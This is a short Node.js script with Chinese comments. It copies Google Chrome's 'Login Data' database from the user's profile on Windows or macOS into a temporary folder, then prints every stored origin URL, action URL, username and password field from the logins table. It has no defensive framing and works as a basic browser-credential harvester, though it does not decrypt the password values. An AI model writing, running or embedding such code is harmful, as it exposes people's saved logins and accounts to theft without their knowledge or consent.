var sqlite3 = require("sqlite3").verbose();
var fs = require("fs");
var path = require("path");
var fileLogin = null;

if ( require("os").type().toLowerCase().indexOf("windows") >= 0 ) {
    
    fileLogin = path.join(process.env.HOME, "/AppData/Local/Google/Chrome/User Data/Default/Login Data");
}

else {
    
    fileLogin = path.join(process.env.HOME, "/Library/Application Support/Google/Chrome/Default/Login Data");
}

/// 生成临时文件。
if ( !fs.existsSync("./tmp") ) {
    fs.mkdirSync("./tmp");
}

fs.writeFileSync("./tmp/Login Data", fs.readFileSync(fileLogin));

/// 获取 logins 中的数据。
var database = new sqlite3.Database("./tmp/Login Data", sqlite3.OPEN_READONLY);

database.each("SELECT origin_url,action_url,username_value,password_value FROM logins", function( $, data ) {
    console.log(data);
});

database.close();